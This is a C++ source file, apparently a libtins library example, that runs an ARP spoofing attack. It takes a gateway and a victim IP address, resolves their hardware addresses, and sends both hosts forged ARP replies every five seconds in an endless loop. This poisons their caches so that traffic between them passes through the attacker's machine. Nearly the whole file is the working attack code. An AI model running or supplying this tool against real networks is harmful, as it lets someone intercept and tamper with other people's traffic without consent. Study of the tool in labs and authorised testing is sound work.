#include <iostream>
#include <string>
#include <stdint.h>
#include <cstdlib>
#include "arp.h"
#include "utils.h"
#include "ethernetII.h"

using namespace std;
using namespace Tins;


int do_arp_spoofing(uint32_t iface, const string &iface_name, uint32_t gw, uint32_t victim, uint32_t own_ip, uint8_t *own_hw) {
    PacketSender sender;
    uint8_t gw_hw[6], victim_hw[6];
    if(!Utils::resolve_hwaddr(iface_name, gw, gw_hw, &sender)) {
        cout << "Could not resolve gateway's ip address.\n";
        return 5;
    }
    if(!Utils::resolve_hwaddr(iface_name, victim, victim_hw, &sender)) {
        cout << "Could not resolve victim's ip address.\n";
        return 6;
    }
    cout << "Using gateway hw address: " << Utils::hwaddr_to_string(gw_hw) << "\n";
    cout << "Using victim hw address: " << Utils::hwaddr_to_string(victim_hw) << "\n";
    cout << "Using own hw address: " << Utils::hwaddr_to_string(own_hw) << "\n";
    
                
    ARP *gw_arp = new ARP(), *victim_arp = new ARP();
    gw_arp->sender_hw_addr(own_hw);
    gw_arp->target_hw_addr(gw_hw);
    gw_arp->sender_ip_addr(victim);
    gw_arp->target_ip_addr(gw);
    gw_arp->opcode(ARP::REPLY);
    
    victim_arp->sender_hw_addr(own_hw);
    victim_arp->target_hw_addr(victim_hw);
    victim_arp->sender_ip_addr(gw);
    victim_arp->target_ip_addr(victim);
    victim_arp->opcode(ARP::REPLY);
    
    EthernetII to_gw(iface, gw_hw, own_hw, gw_arp);
    EthernetII to_victim(iface, victim_hw, own_hw, victim_arp);
    while(true) {
        sender.send(&to_gw);
        sender.send(&to_victim);
        sleep(5);
    }
}

int main(int argc, char *argv[]) {
    if(argc < 3 && cout << "Usage: <Gateway> <Victim> [Interface=eth0]\n")
        return 1;
    uint32_t gw, victim, own_ip;
    uint8_t own_hw[6];
    string iface("eth0");
    try {
        gw     = Utils::ip_to_int(argv[1]);
        victim = Utils::ip_to_int(argv[2]);
    }
    catch(...) {
        cout << "Invalid ip found...\n";
        return 2;
    }
    if(argc == 4)
        iface = argv[3];
        
    uint32_t iface_index;
    if(!Utils::interface_id(iface, iface_index) && cout << "Interface " << iface << " does not exist!\n")
        return 3;
    if(!Utils::interface_hwaddr(iface, own_hw) || !Utils::interface_ip(iface, own_ip)) {
        cout << "Error fetching addresses from " << iface << "\n";
        return 4;
    }
    
        
    return do_arp_spoofing(iface_index, iface, gw, victim, own_ip, own_hw);
}

